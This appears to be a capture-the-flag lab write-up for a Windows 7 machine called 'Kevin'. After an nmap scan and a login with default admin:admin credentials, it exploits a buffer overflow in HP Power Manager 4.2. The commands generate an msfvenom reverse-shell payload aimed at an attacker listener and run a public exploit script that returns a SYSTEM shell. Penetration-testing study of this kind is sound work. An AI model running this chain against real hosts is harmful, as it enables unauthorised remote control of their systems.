---
icon: windows
---

# Kevin - Easy

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.45 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 16:05 EDT                                                                                     
Nmap scan report for 192.168.118.45                                                                                                                 
Host is up (0.029s latency).                                                                                                                        
Not shown: 65523 closed tcp ports (reset)                                                                                                           
PORT      STATE SERVICE       VERSION                                                                                                               
80/tcp    open  http          GoAhead WebServer                                                                                                     
|_http-server-header: GoAhead-Webs                                                                                                                  
| http-title: HP Power Manager                                                                                                                      
|_Requested resource was http://192.168.118.45/index.asp                                                                                            
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                         
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)                                                         
3389/tcp  open  ms-wbt-server Microsoft Terminal Service                                                                                            
|_ssl-date: 2025-09-19T20:06:53+00:00; +1s from scanner time.                                                                                       
| rdp-ntlm-info:                                                                                                                                    
|   Target_Name: KEVIN                                                                                                                              
|   NetBIOS_Domain_Name: KEVIN                                                                                                                      
|   NetBIOS_Computer_Name: KEVIN                                                                                                                    
|   DNS_Domain_Name: kevin                                                                                                                          
|   DNS_Computer_Name: kevin                                                                                                                        
|   Product_Version: 6.1.7600                                                                                                                       
|_  System_Time: 2025-09-19T20:06:45+00:00                                                                                                          
| ssl-cert: Subject: commonName=kevin                                                                                                               
| Not valid before: 2025-09-18T20:03:36                                                                                                             
|_Not valid after:  2026-03-20T20:03:36                                                                                                             
3573/tcp  open  tag-ups-1?                                                                                                                          
49152/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49153/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49154/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49155/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49158/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
49159/tcp open  msrpc         Microsoft Windows RPC                                                                                                 
Device type: general purpose                                                                                                                        
Running: Microsoft Windows 7|2008|8.1                                                                                                               
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1                                             
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1                                                                        
Network Distance: 4 hops                                                                                                                            
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                               
                                                                                                                                                    
Host script results:                                                                                                                                
|_clock-skew: mean: 1h24m00s, deviation: 3h07m49s, median: 0s                                                                                       
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-19T13:06:45-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:6e:65 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-09-19T20:06:45
|_  start_date: 2025-09-19T20:04:30

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   29.66 ms 192.168.45.1
2   27.11 ms 192.168.45.254
3   29.79 ms 192.168.251.1
4   30.00 ms 192.168.118.45
```

### HTTP Port 80 TCP

<figure><img src="../../.gitbook/assets/image (1618).png" alt=""><figcaption></figcaption></figure>

default admin:admin credentials work

<figure><img src="../../.gitbook/assets/image (1619).png" alt=""><figcaption></figcaption></figure>

We can view the version under the Help Tab, this application is vulnerable to a buffer overflow. I came across a good exploitation script on [**Github**](https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3)

### **HP Power Manager 4.2 (Build 7) Buffer Overflow**

```
git clone https://github.com/CountablyInfinite/HP-Power-Manager-Buffer-Overflow-Python3.git
```

Let's create our shell code using msfvenom, make sure to replace your ip and port

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=135  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
```

Now copy the code and replace it with the original from the the python script, make sure to remove the b from in front of each line, byte encoding is not necessary there

<figure><img src="../../.gitbook/assets/image (1623).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready on the port of your choice before running the exploit.

```
python3 hp_pm_exploit_p3.py 192.168.118.45 80 135
```

<figure><img src="../../.gitbook/assets/image (1621).png" alt=""><figcaption></figcaption></figure>

And we got a shell as system, no need for Privesc here!
